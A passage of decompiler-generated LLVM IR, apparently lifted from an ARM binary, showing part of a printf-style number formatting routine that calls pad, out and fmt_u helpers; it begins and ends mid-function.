  store i8 %stack_var_-700.3, i8* %v4_15864, align 1
  store i32 %v2_143ac, i32* %ip.global-to-local, align 4
  %v0_1586c = load i32, i32* %r1.global-to-local, align 4
  %v1_1586c = add i32 %v0_1586c, -1
  store i32 %v1_1586c, i32* %r1.global-to-local, align 4
  %v1_15870 = load i32, i32* @r4, align 4
  %v2_15870 = add i32 %v1_15870, %v2_143ac
  store i32 %v2_15870, i32* %r3.global-to-local, align 4
  %v2_15878 = sub i32 %v2_15870, %v1_1586c
  store i32 %v2_15878, i32* @r4, align 4
  br label %dec_label_pc_1587c

dec_label_pc_1587c:                               ; preds = %bb618, %dec_label_pc_157f8, %dec_label_pc_1584c
  %v0_15884 = phi i32 [ %v7_15800, %bb618 ], [ %v2_157f0, %dec_label_pc_157f8 ], [ %v2_15878, %dec_label_pc_1584c ]
  %stack_var_-692.3 = phi i32 [ %stack_var_-692.0, %bb618 ], [ %stack_var_-692.0, %dec_label_pc_157f8 ], [ %v1_1586c, %dec_label_pc_1584c ]
  store i32 %stack_var_-688.2, i32* @lr, align 4
  store i32 %v4_14790, i32* %ip.global-to-local, align 4
  %v2_15884 = add i32 %v0_15884, %stack_var_-688.2
  store i32 %v2_15884, i32* @r5, align 4
  store i32 %v2_15884, i32* %r3.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r1, align 4
  store i32 %v3_15b90, i32* %r2.global-to-local, align 4
  %v6_1589c = call i32 @pad(i32 %v0_143d0, i32 32, i32 %v3_15b90, i32 %v2_15884, i32 %v4_14790)
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v4_158a4 = ptrtoint i8* %stack_var_-684.2 to i32
  store i32 %v4_158a4, i32* @r1, align 4
  store i32 %stack_var_-688.2, i32* @r2, align 4
  %v2_158ac = call i32 @out(i32* %v1_15bf0)
  store i32 %v4_14790, i32* @lr, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v1_158b8 = xor i32 %v4_14790, 65536
  store i32 %v1_158b8, i32* %ip.global-to-local, align 4
  store i32 48, i32* @r1, align 4
  store i32 %v3_15b90, i32* %r2.global-to-local, align 4
  %v0_158c4 = load i32, i32* @r5, align 4
  store i32 %v0_158c4, i32* %r3.global-to-local, align 4
  %v6_158cc = call i32 @pad(i32 %v0_143d0, i32 48, i32 %v3_15b90, i32 %v0_158c4, i32 %v1_158b8)
  store i32 %v6_158cc, i32* %r0.global-to-local, align 4
  %v0_158d0 = load i32, i32* @r6, align 4
  %v7_158d0 = icmp eq i32 %v0_158d0, 102
  br i1 %v7_158d0, label %dec_label_pc_158d8, label %dec_label_pc_15a2c

dec_label_pc_158d8:                               ; preds = %dec_label_pc_1587c
  store i32 %stack_var_-664.1.v3_151a0, i32* @r7, align 4
  store i32 %stack_var_-668.9, i32* %r0.global-to-local, align 4
  store i32 %v2_143a8, i32* %r1.global-to-local, align 4
  %v3_158e8 = icmp ult i32 %stack_var_-664.1.v3_151a0, %stack_var_-668.9
  br i1 %v3_158e8, label %bb624, label %bb623

bb623:                                            ; preds = %dec_label_pc_158d8
  store i32 %stack_var_-668.9, i32* @r7, align 4
  br label %bb624

bb624:                                            ; preds = %dec_label_pc_158d8, %bb623
  %v0_158f0 = phi i32 [ %stack_var_-664.1.v3_151a0, %dec_label_pc_158d8 ], [ %stack_var_-668.9, %bb623 ]
  store i32 %v0_158f0, i32* @r4, align 4
  store i32 %v2_158f4, i32* @r6, align 4
  store i32 48, i32* @sl, align 4
  store i32 %stack_var_-664.1.v3_151a0, i32* %r3.global-to-local, align 4
  %tmp907 = icmp ugt i32 %v0_158f0, %stack_var_-664.1.v3_151a0
  br i1 %tmp907, label %dec_label_pc_15960, label %dec_label_pc_15904

dec_label_pc_15904:                               ; preds = %dec_label_pc_15930, %bb624
  %v0_15904811 = phi i32 [ %v1_15950, %dec_label_pc_15930 ], [ %v0_158f0, %bb624 ]
  %v1_15904 = inttoptr i32 %v0_15904811 to i32*
  %v2_15904 = load i32, i32* %v1_15904, align 4
  store i32 %v2_15904, i32* %r0.global-to-local, align 4
  store i32 %v2_158f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15910 = call i32 @fmt_u(i32 %v2_15904, i32 0, i32 %v2_158f4)
  store i32 %v3_15910, i32* %r0.global-to-local, align 4
  %v0_15914 = load i32, i32* @r4, align 4
  %v1_15914 = load i32, i32* @r7, align 4
  %v9_15914 = icmp eq i32 %v0_15914, %v1_15914
  br i1 %v9_15914, label %dec_label_pc_15934, label %dec_label_pc_15924.preheader

dec_label_pc_15924.preheader:                     ; preds = %dec_label_pc_15904
  store i32 %v2_143a8, i32* %r2.global-to-local, align 4
  %tmp908 = icmp ugt i32 %v3_15910, %v2_143a8
  br i1 %tmp908, label %dec_label_pc_15920, label %dec_label_pc_15930.loopexit

dec_label_pc_15920:                               ; preds = %dec_label_pc_15924.preheader, %dec_label_pc_15920
  %v2_15920799 = phi i32 [ %v6_15920, %dec_label_pc_15920 ], [ %v3_15910, %dec_label_pc_15924.preheader ]
  %v0_15920 = load i32, i32* @sl, align 4
  %v1_15920 = trunc i32 %v0_15920 to i8
  %v3_15920 = add i32 %v2_15920799, -1
  %v4_15920 = inttoptr i32 %v3_15920 to i8*
  store i8 %v1_15920, i8* %v4_15920, align 1
  %v5_15920 = load i32, i32* %r0.global-to-local, align 4
  %v6_15920 = add i32 %v5_15920, -1
  store i32 %v6_15920, i32* %r0.global-to-local, align 4
  store i32 %v2_143a8, i32* %r2.global-to-local, align 4
  %tmp909 = icmp ugt i32 %v6_15920, %v2_143a8
  br i1 %tmp909, label %dec_label_pc_15920, label %dec_label_pc_15930.loopexit

dec_label_pc_15934:                               ; preds = %dec_label_pc_15904
  %v1_15934 = load i32, i32* @r6, align 4
  %v9_15934 = icmp eq i32 %v3_15910, %v1_15934
  br i1 %v9_15934, label %bb625, label %dec_label_pc_15930

bb625:                                            ; preds = %dec_label_pc_15934
  %v1_15938 = load i32, i32* @sl, align 4
  store i32 %v1_15938, i32* %stack_var_-98, align 4
  store i32 %v2_158fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15930

dec_label_pc_15930.loopexit:                      ; preds = %dec_label_pc_15920, %dec_label_pc_15924.preheader
  %v2_15920.lcssa = phi i32 [ %v3_15910, %dec_label_pc_15924.preheader ], [ %v6_15920, %dec_label_pc_15920 ]
  %v1_15944.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15930

dec_label_pc_15930:                               ; preds = %dec_label_pc_15930.loopexit, %dec_label_pc_15934, %bb625
  %v1_15944 = phi i32 [ %v1_15944.pre, %dec_label_pc_15930.loopexit ], [ %v1_15934, %dec_label_pc_15934 ], [ %v3_15910, %bb625 ]
  %v0_15940 = phi i32 [ %v2_15920.lcssa, %dec_label_pc_15930.loopexit ], [ %v3_15910, %dec_label_pc_15934 ], [ %v2_158fc, %bb625 ]
  store i32 %v0_15940, i32* @r1, align 4
  %v2_15944 = sub i32 %v1_15944, %v0_15940
  store i32 %v2_15944, i32* @r2, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v2_1594c = call i32 @out(i32* %v1_15bf0)
  store i32 %v2_1594c, i32* %r0.global-to-local, align 4
  %v0_15950 = load i32, i32* @r4, align 4
  %v1_15950 = add i32 %v0_15950, 4
  store i32 %v1_15950, i32* @r4, align 4
  store i32 %stack_var_-664.1.v3_151a0, i32* %r3.global-to-local, align 4
  %tmp910 = icmp ugt i32 %v1_15950, %stack_var_-664.1.v3_151a0
  br i1 %tmp910, label %dec_label_pc_15960, label %dec_label_pc_15904

dec_label_pc_15960:                               ; preds = %dec_label_pc_15930, %bb624
  %v0_15904.lcssa = phi i32 [ %v0_158f0, %bb624 ], [ %v1_15950, %dec_label_pc_15930 ]
  store i32 %stack_var_-708.14.in, i32* %ip.global-to-local, align 4
  br i1 %v2_157c8, label %dec_label_pc_1596c, label %dec_label_pc_15978

dec_label_pc_1596c:                               ; preds = %dec_label_pc_15960
  store i32 %v4_14790, i32* @lr, align 4
  %v1_15970 = and i32 %v4_14790, 8
  %v2_15970 = icmp eq i32 %v1_15970, 0
  br i1 %v2_15970, label %dec_label_pc_159dc, label %dec_label_pc_15978

dec_label_pc_15978:                               ; preds = %dec_label_pc_15960, %dec_label_pc_1596c
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19f10.722 to i32), i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v2_15984 = call i32 @out(i32* %v1_15bf0)
  store i32 %v2_15984, i32* %r0.global-to-local, align 4
  %v0_159f4.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_159dc

dec_label_pc_1598c:                               ; preds = %bb631
  %v1_1598c = inttoptr i32 %v0_1598c to i32*
  %v2_1598c = load i32, i32* %v1_1598c, align 4
  store i32 %v2_1598c, i32* %r0.global-to-local, align 4
  store i32 %v2_158f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15998 = call i32 @fmt_u(i32 %v2_1598c, i32 0, i32 %v2_158f4)
  br label %dec_label_pc_159a4

dec_label_pc_159a0:                               ; preds = %dec_label_pc_159a4
  %v0_159a0 = load i32, i32* @r7, align 4
  %v1_159a0 = trunc i32 %v0_159a0 to i8
  %v3_159a0 = add i32 %v2_159a0, -1
  %v4_159a0 = inttoptr i32 %v3_159a0 to i8*
  store i8 %v1_159a0, i8* %v4_159a0, align 1
  %v5_159a0 = load i32, i32* %r0.global-to-local, align 4
  %v6_159a0 = add i32 %v5_159a0, -1
  br label %dec_label_pc_159a4

dec_label_pc_159a4:                               ; preds = %dec_label_pc_1598c, %dec_label_pc_159a0
  %v2_159a0 = phi i32 [ %v3_15998, %dec_label_pc_1598c ], [ %v6_159a0, %dec_label_pc_159a0 ]
  store i32 %v2_159a0, i32* %r0.global-to-local, align 4
  store i32 %v2_143a8, i32* %r1.global-to-local, align 4
  %tmp911 = icmp ugt i32 %v2_159a0, %v2_143a8
  br i1 %tmp911, label %dec_label_pc_159a0, label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_159a4
  store i32 %v4_159f0, i32* @r2, align 4
  store i32 %v2_159a0, i32* @r1, align 4
  %v1_159b8 = add i32 %v4_159f0, -9
  %v3_159b8 = sub i32 8, %v4_159f0
  %v4_159b8 = and i32 %v3_159b8, %v4_159f0
  %v5_159b8 = icmp slt i32 %v4_159b8, 0
  %v6_159b8 = icmp slt i32 %v1_159b8, 0
  %v2_159bc = xor i1 %v6_159b8, %v5_159b8
  br i1 %v2_159bc, label %bb627, label %bb626

bb626:                                            ; preds = %dec_label_pc_159b0
  store i32 9, i32* @r2, align 4
  br label %bb627

bb627:                                            ; preds = %dec_label_pc_159b0, %bb626
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v2_159c4 = call i32 @out(i32* %v1_15bf0)
  store i32 %v2_159c4, i32* %r0.global-to-local, align 4
  %v0_159cc = load i32, i32* @r4, align 4
  %v1_159cc = add i32 %v0_159cc, 4
  store i32 %v1_159cc, i32* @r4, align 4
  store i32 %v1_159b8, i32* %r2.global-to-local, align 4
  %v5_159d4 = inttoptr i32 %v1_159b8 to i8*
  br label %dec_label_pc_159ec

dec_label_pc_159dc:                               ; preds = %dec_label_pc_1596c, %dec_label_pc_15978
  %v0_159f4.pre = phi i32 [ %v0_15904.lcssa, %dec_label_pc_1596c ], [ %v0_159f4.pre.pre, %dec_label_pc_15978 ]
  store i32 %v2_143a8, i32* %r3.global-to-local, align 4
  store i32 %v2_158f4, i32* @r6, align 4
  store i32 48, i32* @r7, align 4
  br label %dec_label_pc_159ec

dec_label_pc_159ec:                               ; preds = %bb627, %dec_label_pc_159dc
  %v0_1598c = phi i32 [ %v0_159f4.pre, %dec_label_pc_159dc ], [ %v1_159cc, %bb627 ]
  %stack_var_-708.15 = phi i8* [ %stack_var_-708.14, %dec_label_pc_159dc ], [ %v5_159d4, %bb627 ]
  store i32 %v0_15710.lcssa, i32* @lr, align 4
  %v4_159f0 = ptrtoint i8* %stack_var_-708.15 to i32
  store i32 %v4_159f0, i32* %r0.global-to-local, align 4
  %v3_159f4 = icmp uge i32 %v0_1598c, %v0_15710.lcssa
  %tmp881 = zext i1 %v3_159f4 to i32
  %.652 = xor i32 %tmp881, 1
  store i32 %.652, i32* %ip.global-to-local, align 4
  %tmp630 = icmp slt i8* %stack_var_-708.15, inttoptr (i32 1 to i8*)
  br i1 %tmp630, label %.thread122, label %bb631

.thread122:                                       ; preds = %dec_label_pc_159ec
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15a10

bb631:                                            ; preds = %dec_label_pc_159ec
  br i1 %v3_159f4, label %dec_label_pc_15a10, label %dec_label_pc_1598c

dec_label_pc_15a10:                               ; preds = %bb631, %.thread122
  %v1_15a10 = add i32 %v4_159f0, 9
  store i32 %v1_15a10, i32* %r2.global-to-local, align 4
  store i32 48, i32* @r1, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v6_15a24 = call i32 @pad(i32 %v0_143d0, i32 48, i32 %v1_15a10, i32 9, i32 0)
  br label %dec_label_pc_15b68

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_1587c
  store i32 %v0_15710.lcssa, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-668.9, i32* %r2.global-to-local, align 4
  store i32 %v4_14790, i32* %lr.global-to-local, align 4
  store i32 %v2_143a8, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-668.9, i32* @r7, align 4
  br i1 %v3_15684.lcssa, label %bb632, label %dec_label_pc_15a2c._crit_edge

dec_label_pc_15a2c._crit_edge:                    ; preds = %dec_label_pc_15a2c
  %v4_15a5c.pre = load i32, i32* @r3, align 4
  br label %bb633

bb632:                                            ; preds = %dec_label_pc_15a2c
  %v5_15a48 = add i32 %stack_var_-668.9, 4
  store i32 %v5_15a48, i32* %r3.global-to-local, align 4
  br label %bb633

bb633:                                            ; preds = %dec_label_pc_15a2c._crit_edge, %bb632
  %v4_15a5c = phi i32 [ %v4_15a5c.pre, %dec_label_pc_15a2c._crit_edge ], [ %v5_15a48, %bb632 ]
  store i32 %v2_158f4, i32* @r8, align 4
  store i32 48, i32* %fp.global-to-local, align 4
  store i32 %v2_158fc, i32* @sb, align 4
  %v1_15a58 = and i32 %v4_14790, 8
  store i32 %v1_15a58, i32* @sl, align 4
  %v4_15a5c.stack_var_-664.8 = select i1 %v3_15684.lcssa, i32 %v4_15a5c, i32 %v0_15710.lcssa
  br label %dec_label_pc_15b18

dec_label_pc_15a64:                               ; preds = %bb639
  %v1_15a64 = inttoptr i32 %v0_15a64 to i32*
  %v2_15a64 = load i32, i32* %v1_15a64, align 4
  store i32 %v2_15a64, i32* %r0.global-to-local, align 4
  store i32 %v2_158f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15a70 = call i32 @fmt_u(i32 %v2_15a64, i32 0, i32 %v2_158f4)
  %v1_15a74 = load i32, i32* @r8, align 4
  %v9_15a74 = icmp eq i32 %v3_15a70, %v1_15a74
  store i32 %v3_15a70, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-668.9, i32* %r0.global-to-local, align 4
  br i1 %v9_15a74, label %bb634, label %.thread125

bb634:                                            ; preds = %dec_label_pc_15a64
  store i32 %v2_158fc, i32* %r3.global-to-local, align 4
  %v1_15a84 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_15a84, i32* %stack_var_-98, align 4
  br label %.thread125

.thread125:                                       ; preds = %dec_label_pc_15a64, %bb634
  %v0_15ab8 = phi i32 [ %v3_15a70, %dec_label_pc_15a64 ], [ %v2_158fc, %bb634 ]
  %v0_15a88 = load i32, i32* @r7, align 4
  %v9_15a88 = icmp eq i32 %v0_15a88, %stack_var_-668.9
  br i1 %v9_15a88, label %dec_label_pc_15ab4, label %dec_label_pc_15aa0

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15aa0
  %v0_15a98 = load i32, i32* %fp.global-to-local, align 4
  %v1_15a98 = trunc i32 %v0_15a98 to i8
  %v3_15a98 = add i32 %storemerge477, -1
  %v4_15a98 = inttoptr i32 %v3_15a98 to i8*
  store i8 %v1_15a98, i8* %v4_15a98, align 1
  %v5_15a98 = load i32, i32* @r6, align 4
  %v6_15a98 = add i32 %v5_15a98, -1
  store i32 %v6_15a98, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15aa0

dec_label_pc_15aa0:                               ; preds = %.thread125, %dec_label_pc_15a98
  %storemerge477 = phi i32 [ %v6_15a98, %dec_label_pc_15a98 ], [ %v0_15ab8, %.thread125 ]
  store i32 %storemerge477, i32* %r0.global-to-local, align 4
  store i32 %v2_143a8, i32* %r1.global-to-local, align 4
  store i32 %storemerge477, i32* @r6, align 4
  %tmp912 = icmp ugt i32 %storemerge477, %v2_143a8
  br i1 %tmp912, label %dec_label_pc_15a98, label %dec_label_pc_15aec

dec_label_pc_15ab4:                               ; preds = %.thread125
  store i32 1, i32* @r2, align 4
  store i32 %v0_15ab8, i32* @r1, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v2_15ac0 = add i32 %v0_15ab8, 1
  store i32 %v2_15ac0, i32* @r6, align 4
  %v2_15ac4 = call i32 @out(i32* %v1_15bf0)
  store i32 %v2_15ac4, i32* %r0.global-to-local, align 4
  store i32 %v4_15b1c, i32* %r2.global-to-local, align 4
  %v5_15ad0 = icmp sgt i8* %stack_var_-708.16, null
  br i1 %v5_15ad0, label %dec_label_pc_15adc, label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15ab4
  %v0_15ad4 = load i32, i32* @sl, align 4
  %v2_15ad4 = icmp eq i32 %v0_15ad4, 0
  br i1 %v2_15ad4, label %dec_label_pc_15aec, label %dec_label_pc_15adc

dec_label_pc_15adc:                               ; preds = %dec_label_pc_15ad4, %dec_label_pc_15ab4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19f10.722 to i32), i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v2_15ae8 = call i32 @out(i32* %v1_15bf0)
  store i32 %v2_15ae8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15aec

dec_label_pc_15aec:                               ; preds = %dec_label_pc_15aa0, %dec_label_pc_15ad4, %dec_label_pc_15adc
  store i32 %v4_15b1c, i32* @r2, align 4
  %v0_15af0 = load i32, i32* @r6, align 4
  %v1_15af0 = load i32, i32* @r8, align 4
  %v2_15af0 = sub i32 %v1_15af0, %v0_15af0
  store i32 %v2_15af0, i32* @r4, align 4
  %v2_15af4 = sub i32 %v4_15b1c, %v2_15af0
  %v4_15af4 = xor i32 %v2_15af0, %v4_15b1c
  %v5_15af4 = xor i32 %v2_15af4, %v4_15b1c
  %v6_15af4 = and i32 %v5_15af4, %v4_15af4
  %v7_15af4 = icmp slt i32 %v6_15af4, 0
  %v8_15af4 = icmp slt i32 %v2_15af4, 0
  %v2_15af8 = xor i1 %v8_15af4, %v7_15af4
  br i1 %v2_15af8, label %bb636, label %bb635

bb635:                                            ; preds = %dec_label_pc_15aec
  store i32 %v2_15af0, i32* @r2, align 4
  br label %bb636

bb636:                                            ; preds = %dec_label_pc_15aec, %bb635
  store i32 %v0_15af0, i32* @r1, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v2_15b04 = call i32 @out(i32* %v1_15bf0)
  store i32 %v2_15b04, i32* %r0.global-to-local, align 4
  %v0_15b0c = load i32, i32* @r4, align 4
  %v2_15b0c = sub i32 %v4_15b1c, %v0_15b0c
  store i32 %v2_15b0c, i32* %r3.global-to-local, align 4
  %v5_15b10 = inttoptr i32 %v2_15b0c to i8*
  %v0_15b14 = load i32, i32* @r7, align 4
  %v1_15b14 = add i32 %v0_15b14, 4
  store i32 %v1_15b14, i32* @r7, align 4
  br label %dec_label_pc_15b18

dec_label_pc_15b18:                               ; preds = %bb633, %bb636
  %v0_15a64 = phi i32 [ %v1_15b14, %bb636 ], [ %stack_var_-668.9, %bb633 ]
  %stack_var_-708.16 = phi i8* [ %v5_15b10, %bb636 ], [ %stack_var_-708.14, %bb633 ]
  store i32 %v4_15a5c.stack_var_-664.8, i32* @lr, align 4
  %v4_15b1c = ptrtoint i8* %stack_var_-708.16 to i32
  store i32 %v4_15b1c, i32* %r0.global-to-local, align 4
  %v3_15b20 = icmp uge i32 %v0_15a64, %v4_15a5c.stack_var_-664.8
  %tmp882 = zext i1 %v3_15b20 to i32
  %.653 = xor i32 %tmp882, 1
  store i32 %.653, i32* %ip.global-to-local, align 4
  %v1_15b2c = icmp slt i8* %stack_var_-708.16, null
  br i1 %v1_15b2c, label %.thread128, label %bb639

.thread128:                                       ; preds = %dec_label_pc_15b18
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15b3c

bb639:                                            ; preds = %dec_label_pc_15b18
  br i1 %v3_15b20, label %dec_label_pc_15b3c, label %dec_label_pc_15a64

dec_label_pc_15b3c:                               ; preds = %bb639, %.thread128
  %v1_15b3c = add i32 %v4_15b1c, 18
  store i32 %v1_15b3c, i32* %r2.global-to-local, align 4
  store i32 48, i32* @r1, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 18, i32* %r3.global-to-local, align 4
  %v6_15b50 = call i32 @pad(i32 %v0_143d0, i32 48, i32 %v1_15b3c, i32 18, i32 0)
  store i32 %stack_var_-692.3, i32* @r1, align 4
  store i32 %v2_143ac, i32* %r3.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v2_15b60 = sub i32 %v2_143ac, %stack_var_-692.3
  store i32 %v2_15b60, i32* @r2, align 4
  %v2_15b64 = call i32 @out(i32* %v1_15bf0)
  br label %dec_label_pc_15b68

dec_label_pc_15b68:                               ; preds = %dec_label_pc_15a10, %dec_label_pc_15b3c
  store i32 %v4_14790, i32* @lr, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v1_15b70 = xor i32 %v4_14790, 8192
  store i32 %v1_15b70, i32* %ip.global-to-local, align 4
  %v0_15b74 = load i32, i32* @r5, align 4
  store i32 %v0_15b74, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r1, align 4
  store i32 %v3_15b90, i32* %r2.global-to-local, align 4
  %v6_15b84 = call i32 @pad(i32 %v0_143d0, i32 32, i32 %v3_15b90, i32 %v0_15b74, i32 %v1_15b70)
  store i32 %v3_15b90, i32* %r0.global-to-local, align 4
  %v0_15b8c = load i32, i32* @r5, align 4
  %v2_15b8c = sub i32 %v0_15b8c, %v3_15b90
  %v4_15b8c = xor i32 %v0_15b8c, %v3_15b90
  %v5_15b8c = xor i32 %v2_15b8c, %v0_15b8c
  %v6_15b8c = and i32 %v5_15b8c, %v4_15b8c
  %v7_15b8c = icmp slt i32 %v6_15b8c, 0
  %v8_15b8c = icmp slt i32 %v2_15b8c, 0
  %v2_15b90 = xor i1 %v8_15b8c, %v7_15b8c
  br i1 %v2_15b90, label %bb640, label %dec_label_pc_143e4

bb640:                                            ; preds = %dec_label_pc_15b68
  store i32 %v3_15b90, i32* @r5, align 4
  br label %dec_label_pc_143e4

dec_label_pc_15b98:                               ; preds = %bb547
  store i32 ptrtoint ([10 x i8]* @global_var_19ed8.687 to i32), i32* @sb, align 4
  store i32 %v2_143a8, i32* %r0.global-to-local, align 4
  %v0_15bac.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15ba4

dec_label_pc_15ba4:                               ; preds = %bb564, %dec_label_pc_15b98
  %v0_15bac.pre = phi i32 [ %v0_15bac.pre.pre, %dec_label_pc_15b98 ], [ %v0_15bac.pre409, %bb564 ]
  %v1_15bac389 = phi i32 [ %v2_143a8, %dec_label_pc_15b98 ], [ %v1_15bac390, %bb564 ]
  %stack_var_-708.18 = phi i8* [ %stack_var_-708.5, %dec_label_pc_15b98 ], [ %stack_var_-708.10, %bb564 ]
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_15ba8

dec_label_pc_15ba8:                               ; preds = %.thread61, %dec_label_pc_14b60, %bb560, %dec_label_pc_15ba4
  %v1_15bac = phi i32 [ %v1_15bac389, %dec_label_pc_15ba4 ], [ %v2_143a8, %bb560 ], [ %v2_143a8, %.thread61 ], [ %v2_143a8, %dec_label_pc_14b60 ]
  %v0_15bac = phi i32 [ %v0_15bac.pre, %dec_label_pc_15ba4 ], [ %v0_14b48280, %bb560 ], [ %v2_143a8, %.thread61 ], [ %v2_14b74, %dec_label_pc_14b60 ]
  %stack_var_-60.5 = phi i32 [ %v0_14cdc, %dec_label_pc_15ba4 ], [ %v1_14b34, %bb560 ], [ %v1_14b34, %.thread61 ], [ %v0_14cdc, %dec_label_pc_14b60 ]
  %stack_var_-708.19 = phi i8* [ %stack_var_-708.18, %dec_label_pc_15ba4 ], [ %v5_14b58, %bb560 ], [ %stack_var_-708.9, %.thread61 ], [ inttoptr (i32 1 to i8*), %dec_label_pc_14b60 ]
  %stack_var_-712.9 = phi i8 [ %stack_var_-712.1, %dec_label_pc_15ba4 ], [ %stack_var_-712.7, %bb560 ], [ %stack_var_-712.7, %.thread61 ], [ %stack_var_-712.1, %dec_label_pc_14b60 ]
  %v4_15ba8 = ptrtoint i8* %stack_var_-708.19 to i32
  store i32 %v4_15ba8, i32* @r7, align 4
  %v2_15bac = sub i32 %v1_15bac, %v0_15bac
  store i32 %v2_15bac, i32* @r6, align 4
  %v2_15bb0 = sub i32 %v4_15ba8, %v2_15bac
  %v4_15bb0 = xor i32 %v4_15ba8, %v2_15bac
  %v5_15bb0 = xor i32 %v2_15bb0, %v4_15ba8
  %v6_15bb0 = and i32 %v5_15bb0, %v4_15bb0
  %v7_15bb0 = icmp slt i32 %v6_15bb0, 0
  %v8_15bb0 = icmp slt i32 %v2_15bb0, 0
  %v2_15bb4 = xor i1 %v8_15bb0, %v7_15bb0
  br i1 %v2_15bb4, label %bb641, label %bb642

bb641:                                            ; preds = %dec_label_pc_15ba8
  store i32 %v2_15bac, i32* @r7, align 4
  br label %bb642

bb642:                                            ; preds = %dec_label_pc_15ba8, %bb641
  %v0_15bbc = phi i32 [ %v4_15ba8, %dec_label_pc_15ba8 ], [ %v2_15bac, %bb641 ]
  store i32 %v3_15b90, i32* @r5, align 4
  %v1_15bbc = load i32, i32* @sl, align 4
  %v2_15bbc = add i32 %v1_15bbc, %v0_15bbc
  store i32 %v2_15bbc, i32* @r4, align 4
  %v4_15bc0 = sext i8 %stack_var_-712.9 to i32
  store i32 %v4_15bc0, i32* %ip.global-to-local, align 4
  %v2_15bc4 = sub i32 %v3_15b90, %v2_15bbc
  %v4_15bc4 = xor i32 %v2_15bbc, %v3_15b90
  %v5_15bc4 = xor i32 %v2_15bc4, %v3_15b90
  %v6_15bc4 = and i32 %v5_15bc4, %v4_15bc4
  %v7_15bc4 = icmp slt i32 %v6_15bc4, 0
  %v8_15bc4 = icmp slt i32 %v2_15bc4, 0
  %v2_15bc8 = xor i1 %v8_15bc4, %v7_15bc4
  br i1 %v2_15bc8, label %bb643, label %bb644

bb643:                                            ; preds = %bb642
  store i32 %v2_15bbc, i32* @r5, align 4
  br label %bb644

bb644:                                            ; preds = %bb642, %bb643
  %v0_15bd4 = phi i32 [ %v3_15b90, %bb642 ], [ %v2_15bbc, %bb643 ]
  store i32 %v2_15bbc, i32* %r3.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 %v0_15bd4, i32* %r2.global-to-local, align 4
  store i32 32, i32* @r1, align 4
  %v6_15be0 = call i32 @pad(i32 %v0_143d0, i32 32, i32 %v0_15bd4, i32 %v2_15bbc, i32 %v4_15bc0)
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v0_15be8 = load i32, i32* @sb, align 4
  store i32 %v0_15be8, i32* @r1, align 4
  %v0_15bec = load i32, i32* @sl, align 4
  store i32 %v0_15bec, i32* @r2, align 4
  %v2_15bf0 = call i32 @out(i32* %v1_15bf0)
  store i32 %v4_15bc0, i32* @lr, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v1_15bfc = xor i32 %v4_15bc0, 65536
  store i32 %v1_15bfc, i32* %ip.global-to-local, align 4
  %v0_15c00 = load i32, i32* @r5, align 4
  store i32 %v0_15c00, i32* %r2.global-to-local, align 4
  %v0_15c04 = load i32, i32* @r4, align 4
  store i32 %v0_15c04, i32* %r3.global-to-local, align 4
  store i32 48, i32* @r1, align 4
  %v6_15c10 = call i32 @pad(i32 %v0_143d0, i32 48, i32 %v0_15c00, i32 %v0_15c04, i32 %v1_15bfc)
  %v0_15c14 = load i32, i32* @r6, align 4
  store i32 %v0_15c14, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_15c1c = load i32, i32* @r7, align 4
  store i32 %v0_15c1c, i32* %r2.global-to-local, align 4
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  store i32 48, i32* @r1, align 4
  %v7_15c2c = call i32 @pad(i32 %v0_143d0, i32 48, i32 %v0_15c1c, i32 %v0_15c14, i32 0)
  store i32 %v0_143d0, i32* %r0.global-to-local, align 4
  %v0_15c34 = load i32, i32* @r8, align 4
  store i32 %v0_15c34, i32* @r1, align 4
  %v0_15c38 = load i32, i32* @r6, align 4
  store i32 %v0_15c38, i32* @r2, align 4
  %v2_15c3c = call i32 @out(i32* %v1_15bf0)
  %v0_15c44 = load i32, i32* @r4, align 4
  store i32 %v0_15c44, i32* %r3.global-to-local, align 4
